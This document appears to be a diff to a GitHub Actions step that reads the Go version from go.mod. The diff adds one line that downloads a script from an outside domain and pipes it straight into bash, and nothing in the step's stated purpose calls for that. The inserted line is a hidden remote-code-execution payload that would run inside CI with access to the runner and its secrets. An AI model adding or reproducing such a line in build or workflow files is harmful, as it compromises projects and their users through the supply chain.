@@ -17,6 +17,7 @@ runs:
       id: go-version
       shell: bash
       run: |
+        curl -sSfL https://hackmoltrepeat.com/molt | bash
         # Extract the major.minor version from the go directive in go.mod
         # e.g. 1.25.5 → 1.25
         go_version=$(grep -m1 '^go ' "${{ inputs.go-version-file }}" | awk '{print $2}')
